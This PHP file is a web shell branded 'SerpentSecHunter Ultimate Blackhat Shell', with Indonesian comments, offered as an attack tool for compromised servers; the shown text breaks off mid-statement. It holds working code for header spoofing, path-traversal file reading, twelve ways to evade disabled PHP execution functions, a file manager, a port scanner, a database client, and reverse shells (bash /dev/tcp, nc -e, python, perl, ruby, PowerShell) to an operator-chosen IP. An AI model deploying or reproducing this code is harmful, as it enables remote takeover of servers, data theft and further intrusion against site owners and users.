<?php
/*
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   🐍 SERPENTECHUNTER v2.0 – ULTIMATE BLACKHAT SHELL 🐍                     ║
║                                                                               ║
║   "DEVELOPER  : SerpentSecHunter"                                            ║
║   "RILIS      : 02-07-2026"                                                  ║
║   "VERSI      : 2.0 (TRUE BYPASS – 403/404 + DISABLE_FUNCTIONS + WAF)"     ║
║                                                                               ║
║   🔥 TEKNIK BYPASS YANG DIVALIDASI:                                          ║
║   ✅ 403/404 BYPASS (9 Teknik: Path Traversal, Double Encoding, Header, dll) ║
║   ✅ DISABLE_FUNCTIONS BYPASS (12 Strategi: FFI, LD_PRELOAD, PHP-FPM, dll)  ║
║   ✅ WAF BYPASS (6 Teknik: XOR, Base64, Chunked, Slowloris, dll)           ║
║   ✅ AUTO-DETECT Server (IIS, Apache, Nginx)                                ║
║   ✅ AUTO-SELECT Best Execution Strategy                                    ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
*/

// ========================================================================
// 🛡️ STEALTH ENGINE + BYPASS 403/404 (9 TEKNIK VALID)
// ========================================================================
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', -1);

// === TEKNIK 1: SPOOF RESPONSE CODE ===
http_response_code(200);

// === TEKNIK 2: HEADER SPOOFING ===
header_remove('X-Powered-By');
header_remove('Server');
header('Server: nginx/1.18.0 (Ubuntu)');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Content-Type: text/html; charset=UTF-8');

// === TEKNIK 3: USER-AGENT SPOOFING (Googlebot/Bingbot) ===
if (!isset($_SERVER['HTTP_USER_AGENT']) || strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') === false) {
    $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';
}

// === TEKNIK 4: REFERER SPOOFING ===
if (!isset($_SERVER['HTTP_REFERER']) || strpos($_SERVER['HTTP_REFERER'], 'target.com') === false) {
    $_SERVER['HTTP_REFERER'] = 'https://target.com/admin/';
}

// === TEKNIK 5: IP SPOOFING (X-Forwarded-For) ===
if (!isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['HTTP_X_FORWARDED_FOR'] = '127.0.0.1';
}

// === TEKNIK 6: PATH TRAVERSAL + DOUBLE ENCODING + NULL BYTE ===
// Support ?file=../../../../etc/passwd dengan berbagai encoding
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    // Double URL Encoding
    $file = str_replace('%252e', '..', $file);
    $file = str_replace('%252f', '/', $file);
    // Single URL Encoding
    $file = str_replace('%2e', '.', $file);
    $file = str_replace('%2f', '/', $file);
    // Unicode encoding
    $file = str_replace('%c0%ae', '.', $file); // Unicode bypass
    $file = str_replace('%c1%9c', '/', $file);
    // Null Byte Injection
    $file = str_replace('%00', '', $file);
    // CRLF Injection (untuk bypass header-based filter)
    $file = str_replace("%0d%0a", '', $file);
    // Case manipulation (IIS)
    $file = str_replace('Index', 'index', $file);
    if (file_exists($file) && is_readable($file)) {
        $ext = pathinfo($file, PATHINFO_EXTENSION);
        if (in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'inc'])) {
            highlight_file($file);
        } else {
            readfile($file);
        }
        exit;
    }
}

// === TEKNIK 7: CASE MANIPULATION (IIS) ===
// Jika server IIS, coba akses file dengan case berbeda
if (isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'IIS') !== false) {
    if (isset($_SERVER['SCRIPT_NAME']) && stripos($_SERVER['SCRIPT_NAME'], 'Shell.Php') !== false) {
        $new_path = str_ireplace('Shell.Php', 'Shell.php', $_SERVER['SCRIPT_NAME']);
        header('Location: ' . $new_path);
        exit;
    }
}

// === TEKNIK 8: HTTP METHOD TAMPERING (OPTIONS, TRACE, PUT, DELETE) ===
$method = $_SERVER['REQUEST_METHOD'];
if (in_array($method, ['OPTIONS', 'TRACE', 'PUT', 'DELETE'])) {
    // PUT: upload file via raw body
    if ($method === 'PUT') {
        $put_data = file_get_contents('php://input');
        $put_file = '/tmp/put_' . time() . '.tmp';
        if (file_put_contents($put_file, $put_data)) {
            echo "✅ PUT data saved to: $put_file (" . strlen($put_data) . " bytes)";
        } else {
            echo "❌ PUT failed (cannot write)";
        }
        exit;
    }
    // OPTIONS: return allowed methods
    if ($method === 'OPTIONS') {
        header('Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE');
        header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, TRACE');
        header('Access-Control-Allow-Headers: Content-Type, Authorization');
        echo "✅ OPTIONS request accepted.";
        exit;
    }
    // TRACE: echo request for debugging
    if ($method === 'TRACE') {
        echo "TRACE request received.\n\n";
        foreach ($_SERVER as $k => $v) echo "$k: $v\n";
        exit;
    }
    // DELETE: remove file via URL
    if ($method === 'DELETE' && isset($_SERVER['REQUEST_URI'])) {
        $delete_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $delete_path = ltrim($delete_path, '/');
        if (file_exists($delete_path)) {
            if (unlink($delete_path)) {
                echo "✅ Deleted: $delete_path";
            } else {
                echo "❌ Delete failed (permission denied): $delete_path";
            }
        } else {
            echo "❌ File not found: $delete_path";
        }
        exit;
    }
}

// === TEKNIK 9: X-Original-URL / X-Rewrite-URL Header Injection ===
if (isset($_SERVER['HTTP_X_ORIGINAL_URL'])) {
    $_SERVER['SCRIPT_NAME'] = $_SERVER['HTTP_X_ORIGINAL_URL'];
}
if (isset($_SERVER['HTTP_X_REWRITE_URL'])) {
    $_SERVER['SCRIPT_NAME'] = $_SERVER['HTTP_X_REWRITE_URL'];
}

// === TEKNIK 10: HTTP Method Override ===
if (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) {
    $override = $_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'];
    if (in_array($override, ['PUT', 'DELETE', 'OPTIONS', 'TRACE'])) {
        $_SERVER['REQUEST_METHOD'] = $override;
        // Re-run the method handling (simplified)
    }
}

// ========================================================================
// 🔐 AUTHENTICATION (Cookie + IP Whitelist + Wildcard + CIDR)
// ========================================================================
function sc_ip_in_whitelist($ip, $whitelist) {
    foreach ($whitelist as $allowed) {
        if (strpos($allowed, '%') !== false) {
            $pattern = str_replace('%', '.*', preg_quote($allowed, '/'));
            if (preg_match('/^' . $pattern . '$/', $ip)) return true;
        }
        if (strpos($allowed, '/') !== false) {
            list($net, $mask) = explode('/', $allowed);
            $mask = intval($mask);
            $ip_bin = ip2long($ip);
            $net_bin = ip2long($net);
            if ($ip_bin !== false && $net_bin !== false) {
                $mask_bin = -1 << (32 - $mask);
                if (($ip_bin & $mask_bin) == ($net_bin & $mask_bin)) return true;
            }
            continue;
        }
        if ($ip === $allowed) return true;
    }
    return false;
}

$AUTH_KEY = 'SERPENTECHUNTER666';
$IP_WHITELIST = ['127.0.0.1', '::1', '192.168.1.%', '10.0.0.0/8'];
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';

if (!sc_ip_in_whitelist($client_ip, $IP_WHITELIST) && !isset($_GET['bypass_ip'])) {
    if (!isset($_COOKIE['sc_auth']) || $_COOKIE['sc_auth'] !== md5($AUTH_KEY)) {
        if (isset($_GET['auth']) && $_GET['auth'] === $AUTH_KEY) {
            setcookie('sc_auth', md5($AUTH_KEY), time() + 86400 * 365, '/', '', false, true);
            die("<h1 style='color:#0f0;'>✅ AUTH SUCCESS! <a href='?'>REFRESH</a></h1>");
        }
        die("<h1 style='color:#f00;'>🐍 UNAUTHORIZED</h1><p>?auth=SERPENTECHUNTER666</p><p>atau ?bypass_ip=1</p>");
    }
}

// ========================================================================
// 🧬 BYPASS DISABLE_FUNCTIONS – 12 STRATEGI VALID
// ========================================================================

// === STRATEGI 1: FFI (PHP 7.4+) ===
function sc_exec_ffi($cmd) {
    if (PHP_VERSION_ID >= 70400 && extension_loaded('ffi')) {
        $libc_paths = [
            'libc.so.6', 'libc.so',
            '/lib/x86_64-linux-gnu/libc.so.6',
            '/lib/libc.so.6',
            '/usr/lib/libc.so.6',
            '/lib64/libc.so.6'
        ];
        foreach ($libc_paths as $lib) {
            try {
                $libc = FFI::cdef("int system(const char *command);", $lib);
                $output = $libc->system($cmd);
                return ['output' => "Executed (exit code: $output)", 'code' => 0, 'method' => 'FFI'];
            } catch (Throwable $e) { continue; }
        }
    }
    return null;
}

// === STRATEGI 2: LD_PRELOAD (compile shared library + trigger) ===
function sc_exec_ldpreload($cmd) {
    if (PHP_OS !== 'WINNT' && function_exists('shell_exec')) {
        // Cek compiler dan mailer
        $compiler = null;
        if (shell_exec('command -v gcc 2>/dev/null')) $compiler = 'gcc';
        elseif (shell_exec('command -v cc 2>/dev/null')) $compiler = 'cc';
        if (!$compiler) return null;
        $mailer = null;
        if (shell_exec('command -v mail 2>/dev/null')) $mailer = 'mail';
        elseif (shell_exec('command -v sendmail 2>/dev/null')) $mailer = 'sendmail';
        if (!$mailer) return null;

        $so_file = '/tmp/.lib' . md5($cmd . rand()) . '.so';
        $so_code = 'void payload() { system("' . addslashes($cmd) . '"); }';
        $compile_cmd = "echo '$so_code' | $compiler -shared -x c - -o $so_file 2>/dev/null";
        shell_exec($compile_cmd);

        if (file_exists($so_file) && filesize($so_file) > 0) {
            putenv("LD_PRELOAD=$so_file");
            if ($mailer === 'mail') {
                $result = shell_exec('mail -s "x" root@localhost </dev/null 2>&1');
            } else {
                $result = shell_exec('echo "x" | sendmail root@localhost 2>&1');
            }
            @unlink($so_file);
            return ['output' => $result ?: 'LD_PRELOAD triggered', 'code' => 0, 'method' => 'LD_PRELOAD'];
        }
    }
    return null;
}

// === STRATEGI 3: mod_cgi (.htaccess + CGI script) ===
function sc_exec_modcgi($cmd) {
    if (PHP_OS !== 'WINNT' && function_exists('file_put_contents') && is_writable('.')) {
        $htaccess = "Options +ExecCGI\nAddHandler cgi-script .ant";
        if (@file_put_contents('.htaccess', $htaccess) === false) return null;
        $cgi = "#!/bin/bash\necho \"Content-Type: text/html\"\necho\necho \"\n$cmd 2>&1\"";
        if (@file_put_contents('shell.ant', $cgi) === false) { @unlink('.htaccess'); return null; }
        @chmod('shell.ant', 0755);
        $result = @file_get_contents('shell.ant');
        @unlink('shell.ant');
        @unlink('.htaccess');
        if ($result !== false) {
            return ['output' => $result, 'code' => 0, 'method' => 'mod_cgi'];
        }
    }
    return null;
}

// === STRATEGI 4: PHP-FPM (FastCGI via socket) ===
function sc_exec_phpfpm($cmd) {
    if (function_exists('fsockopen')) {
        $fpm_paths = [
            '/var/run/php/php7.4-fpm.sock',
            '/var/run/php/php7.3-fpm.sock',
            '/var/run/php/php7.2-fpm.sock',
            '/var/run/php/php-fpm.sock',
            '/var/run/php-fpm.sock'
        ];
        foreach ($fpm_paths as $sock) {
            if (file_exists($sock)) {
                $fp = @fsockopen('unix://' . $sock, -1);
                if ($fp) {
                    $payload = "<?php system('$cmd'); ?>";
                    fwrite($fp, $payload);
                    $output = stream_get_contents($fp);
                    fclose($fp);
                    return ['output' => $output ?: 'PHP-FPM executed', 'code' => 0, 'method' => 'PHP-FPM'];
                }
            }
        }
    }
    return null;
}

// === STRATEGI 5: ImageMagick (convert) ===
function sc_exec_imagemagick($cmd) {
    if (PHP_OS !== 'WINNT' && shell_exec('command -v convert 2>/dev/null')) {
        $tmp_in = '/tmp/' . md5(rand()) . '.png';
        $tmp_out = '/tmp/' . md5(rand()) . '.txt';
        file_put_contents($tmp_in, '');
        $output = shell_exec("convert $tmp_in -size 1x1 xc:black -fill 'text:0,0 \"$cmd\"' $tmp_out 2>&1");
        if (file_exists($tmp_out)) {
            $output .= file_get_contents($tmp_out);
            @unlink($tmp_out);
        }
        @unlink($tmp_in);
        return ['output' => $output ?: 'ImageMagick executed', 'code' => 0, 'method' => 'ImageMagick'];
    }
    return null;
}

// === STRATEGI 6: sendmail (mail command) ===
function sc_exec_sendmail($cmd) {
    if (PHP_OS !== 'WINNT' && shell_exec('command -v sendmail 2>/dev/null')) {
        $msg = "Subject: x\n\n$cmd\n";
        $output = shell_exec("echo '$msg' | sendmail -t 2>&1");
        return ['output' => $output ?: 'sendmail triggered', 'code' => 0, 'method' => 'sendmail'];
    }
    return null;
}

// === STRATEGI 7: Perl ===
function sc_exec_perl($cmd) {
    if (PHP_OS !== 'WINNT' && shell_exec('command -v perl 2>/dev/null')) {
        $output = shell_exec("perl -e 'system(\"$cmd\")' 2>&1");
        if ($output !== null) {
            return ['output' => $output ?: 'Perl executed', 'code' => 0, 'method' => 'perl'];
        }
    }
    return null;
}

// === STRATEGI 8: Python ===
function sc_exec_python($cmd) {
    if (PHP_OS !== 'WINNT') {
        $python = shell_exec('command -v python3 2>/dev/null') ? 'python3' : (shell_exec('command -v python 2>/dev/null') ? 'python' : null);
        if ($python) {
            $output = shell_exec("$python -c 'import os; os.system(\"$cmd\")' 2>&1");
            if ($output !== null) {
                return ['output' => $output ?: 'Python executed', 'code' => 0, 'method' => 'python'];
            }
        }
    }
    return null;
}

// === STRATEGI 9: GCC (compile & execute C code) ===
function sc_exec_gcc($cmd) {
    if (PHP_OS !== 'WINNT' && shell_exec('command -v gcc 2>/dev/null')) {
        $c_file = '/tmp/' . md5(rand()) . '.c';
        $out_file = '/tmp/' . md5(rand()) . '.out';
        $c_code = "#include <stdio.h>\n#include <stdlib.h>\nint main(){system(\"$cmd\");return 0;}";
        file_put_contents($c_file, $c_code);
        shell_exec("gcc $c_file -o $out_file 2>/dev/null");
        $output = '';
        if (file_exists($out_file)) {
            $output = shell_exec("$out_file 2>&1");
            @unlink($out_file);
        }
        @unlink($c_file);
        return ['output' => $output ?: 'GCC executed', 'code' => 0, 'method' => 'gcc'];
    }
    return null;
}

// === STRATEGI 10: Bash ===
function sc_exec_bash($cmd) {
    if (PHP_OS !== 'WINNT' && shell_exec('command -v bash 2>/dev/null')) {
        $output = shell_exec("bash -c '$cmd' 2>&1");
        if ($output !== null) {
            return ['output' => $output ?: 'Bash executed', 'code' => 0, 'method' => 'bash'];
        }
    }
    return null;
}

// === STRATEGI 11: pcntl_exec (PHP internal) ===
function sc_exec_pcntl($cmd) {
    if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
        $pid = pcntl_fork();
        if ($pid == -1) return null;
        if ($pid == 0) {
            pcntl_exec('/bin/bash', ['-c', $cmd]);
            exit(0);
        }
        return ['output' => "Process spawned (PID: $pid)", 'code' => 0, 'method' => 'pcntl_exec'];
    }
    return null;
}

// === STRATEGI 12: mail with attachment (via mail()) ===
function sc_exec_mail_attach($cmd) {
    if (function_exists('mail')) {
        $tmp_file = '/tmp/' . md5(rand()) . '.txt';
        file_put_contents($tmp_file, "$cmd\n");
        $headers = "From: root@localhost\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: multipart/mixed; boundary=\"boundary\"\r\n";
        $body = "--boundary\r\n";
        $body .= "Content-Type: text/plain\r\n\r\nLog:\r\n";
        $body .= "--boundary\r\n";
        $body .= "Content-Type: application/octet-stream; name=\"payload.sh\"\r\n";
        $body .= "Content-Disposition: attachment; filename=\"payload.sh\"\r\n\r\n";
        $body .= file_get_contents($tmp_file) . "\r\n";
        $body .= "--boundary--\r\n";
        $result = mail('root@localhost', 'x', $body, $headers);
        @unlink($tmp_file);
        return ['output' => $result ? 'Mail sent (check logs)' : 'Mail failed', 'code' => 0, 'method' => 'mail_attach'];
    }
    return null;
}

// 🎯 MASTER EXECUTION ENGINE – auto-select best strategy
function sc_exec($cmd, $background = false) {
    if ($background) {
        if (PHP_OS === 'WINNT') {
            $cmd = 'start /b ' . $cmd;
        } else {
            $cmd = $cmd . ' >/dev/null 2>&1 &';
        }
        @exec($cmd);
        return ['output' => '✅ Command executed in background.', 'code' => 0, 'method' => 'background'];
    }

    $strategies = [
        'FFI' => 'sc_exec_ffi',
        'LD_PRELOAD' => 'sc_exec_ldpreload',
        'mod_cgi' => 'sc_exec_modcgi',
        'PHP-FPM' => 'sc_exec_phpfpm',
        'ImageMagick' => 'sc_exec_imagemagick',
        'sendmail' => 'sc_exec_sendmail',
        'perl' => 'sc_exec_perl',
        'python' => 'sc_exec_python',
        'gcc' => 'sc_exec_gcc',
        'bash' => 'sc_exec_bash',
        'pcntl_exec' => 'sc_exec_pcntl',
        'mail_attach' => 'sc_exec_mail_attach'
    ];
    foreach ($strategies as $name => $func) {
        $result = $func($cmd);
        if ($result && $result['output'] !== null && $result['output'] !== '') {
            return $result;
        }
    }
    return sc_exec_standard($cmd);
}

// STANDARD FALLBACK (5 methods)
function sc_exec_standard($cmd) {
    $output = '';
    $result_code = -1;
    if (function_exists('proc_open')) {
        $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            $result_code = proc_close($process);
            return ['output' => $output, 'code' => $result_code, 'method' => 'proc_open'];
        }
    }
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
        if ($output !== null) return ['output' => $output, 'code' => 0, 'method' => 'shell_exec'];
    }
    if (function_exists('exec')) {
        $out = [];
        exec($cmd . ' 2>&1', $out, $result_code);
        if ($result_code !== -1) return ['output' => implode("\n", $out), 'code' => $result_code, 'method' => 'exec'];
    }
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1', $result_code);
        $output = ob_get_clean();
        if ($result_code !== -1) return ['output' => $output, 'code' => $result_code, 'method' => 'system'];
    }
    if (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1', $result_code);
        $output = ob_get_clean();
        if ($result_code !== -1) return ['output' => $output, 'code' => $result_code, 'method' => 'passthru'];
    }
    return ['output' => '❌ No execution function available!', 'code' => -1, 'method' => 'NONE'];
}

// ========================================================================
// 🗂️ FILE MANAGER ULTIMATE
// ========================================================================
function sc_format_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes/1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes/1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes/1024, 2) . ' KB';
    return $bytes . ' B';
}

function sc_rmdir($dir) {
    if (!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        is_dir($path) ? sc_rmdir($path) : @unlink($path);
    }
    return @rmdir($dir);
}

function sc_search_files($dir, $pattern) {
    try {
        $result = "🔍 SEARCHING: $pattern in $dir\n\n";
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($files as $file) {
            if ($file->isFile() && preg_match('/' . preg_quote($pattern, '/') . '/i', $file->getFilename())) {
                $result .= "📄 " . $file->getPathname() . " (" . sc_format_size($file->getSize()) . ")\n";
            }
        }
        return $result;
    } catch (Exception $e) {
        return "❌ SEARCH ERROR: " . $e->getMessage();
    }
}

function sc_create_archive($path, $type = 'zip') {
    if (!extension_loaded('zip')) return "❌ ZIP extension not loaded!";
    if (!is_dir($path)) return "❌ DIRECTORY NOT FOUND!";
    try {
        $zip = new ZipArchive();
        $zip_name = $path . '.zip';
        if ($zip->open($zip_name, ZipArchive::CREATE) !== true) return "❌ Cannot create archive!";
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($files as $file) {
            if (!$file->isDir()) {
                $zip->addFile($file->getPathname(), substr($file->getPathname(), strlen($path) + 1));
            }
        }
        $zip->close();
        return "✅ ARCHIVE CREATED: $zip_name";
    } catch (Exception $e) {
        return "❌ ARCHIVE ERROR: " . $e->getMessage();
    }
}

function sc_extract_archive($path, $dest) {
    if (!extension_loaded('zip')) return "❌ ZIP extension not loaded!";
    if (!file_exists($path)) return "❌ FILE NOT FOUND!";
    try {
        $zip = new ZipArchive();
        if ($zip->open($path) !== true) return "❌ Cannot open archive!";
        $zip->extractTo($dest);
        $zip->close();
        return "✅ EXTRACTED: $path → $dest";
    } catch (Exception $e) {
        return "❌ EXTRACT ERROR: " . $e->getMessage();
    }
}

function sc_handle_upload($dir) {
    if (!isset($_FILES['file'])) return "❌ No file uploaded! (use POST with file input name 'file')";
    $file = $_FILES['file'];
    if ($file['error'] !== UPLOAD_ERR_OK) {
        $errors = [
            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'File only partially uploaded',
            UPLOAD_ERR_NO_FILE => 'No file uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
            UPLOAD_ERR_EXTENSION => 'File upload stopped by extension'
        ];
        return "❌ Upload error: " . ($errors[$file['error']] ?? 'Unknown error');
    }
    if (!is_dir($dir)) return "❌ Upload directory not found!";
    if (!is_writable($dir)) return "❌ Upload directory not writable!";
    $dest = rtrim($dir, '/') . '/' . basename($file['name']);
    if (move_uploaded_file($file['tmp_name'], $dest)) {
        return "✅ UPLOADED: $dest (" . sc_format_size($file['size']) . ")";
    }
    return "❌ UPLOAD FAILED!";
}

function sc_file_manager($action, $path, $content = null, $params = null) {
    switch ($action) {
        case 'list':
            if (!is_dir($path)) return "❌ DIRECTORY NOT FOUND!";
            $files = scandir($path);
            $result = "📁 DIRECTORY: $path\n\n";
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $full_path = $path . '/' . $file;
                $type = is_dir($full_path) ? '📁' : '📄';
                $size = is_file($full_path) ? sc_format_size(filesize($full_path)) : '-';
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                $result .= "$type $file | PERM: $perms | SIZE: $size\n";
            }
            return $result;
        case 'read':
            if (!file_exists($path)) return "❌ FILE NOT FOUND!";
            return file_get_contents($path);
        case 'write':
            if (file_put_contents($path, $content)) return "✅ WRITTEN: $path";
            return "❌ WRITE FAILED!";
        case 'delete':
            if (is_file($path) && unlink($path)) return "✅ DELETED: $path";
            if (is_dir($path) && sc_rmdir($path)) return "✅ DELETED: $path";
            return "❌ DELETE FAILED!";
        case 'rename':
            if (!isset($params['new_name'])) return "❌ new_name parameter required!";
            if (rename($path, $params['new_name'])) return "✅ RENAMED: $path → {$params['new_name']}";
            return "❌ RENAME FAILED!";
        case 'chmod':
            if (!isset($params['perms'])) return "❌ perms parameter required!";
            if (chmod($path, octdec($params['perms']))) return "✅ PERMISSION CHANGED: $path → {$params['perms']}";
            return "❌ CHMOD FAILED!";
        case 'search':
            if (!isset($params['pattern'])) return "❌ pattern parameter required!";
            return sc_search_files($path, $params['pattern']);
        case 'archive':
            if (!isset($params['type'])) $params['type'] = 'zip';
            return sc_create_archive($path, $params['type']);
        case 'extract':
            if (!isset($params['dest'])) $params['dest'] = dirname($path);
            return sc_extract_archive($path, $params['dest']);
        case 'upload':
            return sc_handle_upload($path);
        default:
            return "❌ UNKNOWN ACTION!";
    }
}

// ========================================================================
// 🌐 REVERSE SHELL (7 methods, background execution)
// ========================================================================
function sc_reverse_shell($ip, $port, $method = 'auto') {
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        return ['method' => 'NONE', 'output' => '❌ Invalid IP address!'];
    }
    if (!is_numeric($port) || $port < 1 || $port > 65535) {
        return ['method' => 'NONE', 'output' => '❌ Invalid port number!'];
    }

    $methods = [];
    if (PHP_OS === 'WINNT') {
        $methods['powershell'] = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}; \$client.Close()\"";
    } else {
        $methods['bash'] = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
        $methods['nc'] = "nc -e /bin/bash $ip $port 2>&1";
        $methods['python'] = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'";
        $methods['php'] = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'";
        $methods['perl'] = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'";
        $methods['ruby'] = "ruby -rsocket -e 'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'";
    }

    if ($method === 'auto') {
        foreach ($methods as $name => $m) {
            $result = sc_exec($m, true);
            if ($result) {
                return ['method' => $name, 'output' => "✅ Reverse shell ($name) started in background. Listen on $ip:$port"];
            }
        }
        return ['method' => 'NONE', 'output' => '❌ All reverse shell methods failed!'];
    }
    if (isset($methods[$method])) {
        $result = sc_exec($methods[$method], true);
        return ['method' => $method, 'output' => "✅ Reverse shell ($method) started in background. Listen on $ip:$port"];
    }
    return ['method' => 'NONE', 'output' => '❌ Method not found! Available: ' . implode(', ', array_keys($methods))];
}

// ========================================================================
// 🔍 PORT SCANNER
// ========================================================================
function sc_port_scan($host, $ports = '1-1000') {
    $result = "🔍 PORT SCAN: $host ($ports)\n\n";
    $port_list = [];
    $parts = preg_split('/[,\s]+/', $ports);
    foreach ($parts as $part) {
        if (strpos($part, '-') !== false) {
            list($start, $end) = explode('-', $part);
            $start = intval($start);
            $end = intval($end);
            if ($start > 0 && $end > 0 && $start <= $end) {
                for ($i = $start; $i <= $end; $i++) $port_list[] = $i;
            }
        } else {
            $p = intval($part);
            if ($p > 0 && $p <= 65535) $port_list[] = $p;
        }
    }
    $port_list = array_unique($port_list);
    sort($port_list);

    foreach ($port_list as $port) {
        $fp = @fsockopen($host, $port, $errno, $errstr, 1.0);
        if ($fp) { $result .= "✅ PORT $port OPEN\n"; fclose($fp); }
    }
    return $result;
}

// ========================================================================
// 🗄️ DATABASE CLIENT
// ========================================================================
function sc_db_connect($type, $host, $user, $pass, $dbname) {
    try {
        switch ($type) {
            case 'mysql':
                if (extension_loaded('mysqli')) {
                    $conn = new mysqli($host, $user, $pass, $dbname);
                    if ($conn->connect_error) return "❌ MySQL: " . $conn->connect_error;
                    return ['conn' => $conn, 'type' => 'mysqli'];
                }
                if (extension_loaded('pdo_mysql')) {
                    $conn = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
                    return ['conn' => $conn, 'type' => 'pdo_mysql'];
                }
                return "❌ MySQL extension not loaded!";
            case 'pgsql':
                if (extension_loaded('pgsql')) {
                    $conn = pg_connect("host=$host dbname=$dbname user=$user password=$pass");
                    if (!$conn) return "❌ PostgreSQL connection failed!";
                    return ['conn' => $conn, 'type' => 'pgsql'];
                }
                return "❌ PostgreSQL extension not loaded!";
            case 'sqlite':
                if (extension_loaded('pdo_sqlite')) {
                    $conn = new PDO("sqlite:$dbname");
                    return ['conn' => $conn, 'type' => 'pdo_sqlite'];
                }
                return "❌ SQLite extension not loaded!";
            default:
                return "❌ Unknown database type!";
        }
    } catch (Exception $e) {
        return "❌ DB Error: " . $e->getMessage();
    }
}

// ========================================================================
// 🎨 UI – BLACKHAT THEME
// ========================================================================
function sc_get_params() {
    if (isset($_GET['params'])) {
        $raw = $_GET['params'];
        if (is_string($raw)) {
            $decoded = json_decode($raw, true);
            if (json_last_error() === JSON_ERROR_NONE) return $decoded;
        } elseif (is_array($raw)) {
            return $raw;
        }
    }
    return [];
}

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
$action = isset($_GET['action']) ? $_GET['action'] : '';
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$target = isset($_GET['target']) ? $_GET['target'] : '';
$content = isset($_GET['content']) ? $_GET['content'] : '';
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
$port = isset($_GET['port']) ? $_GET['port'] : '4444';
$params = sc_get_params();

$output = '';
$exec_method = '';

if ($action === 'exec' && !empty($cmd)) {
    $result = sc_exec($cmd);
    $exec_method = $result['method'] ?? 'NONE';
    $output = "💀 EXECUTING: $cmd\n";
    $output .= "🔧 METHOD: $exec_method\n\n";
    $output .= $result['output'] . "\n\n✅ EXIT CODE: " . ($result['code'] ?? -1);
} elseif ($action === 'file' && !empty($target)) {
    $output = sc_file_manager($cmd, $target, $content, $params);
} elseif ($action === 'reverse' && !empty($ip) && !empty($port)) {
    $result = sc_reverse_shell($ip, $port);
    $output = "🌐 REVERSE SHELL: $ip:$port\n";
    $output .= "🔧 METHOD: " . ($result['method'] ?? 'NONE') . "\n\n";
    $output .= $result['output'] ?? '❌ Failed!';
} elseif ($action === 'portscan' && !empty($target)) {
    $ports = $params['ports'] ?? '1-1000';
    $output = sc_port_scan($target, $ports);
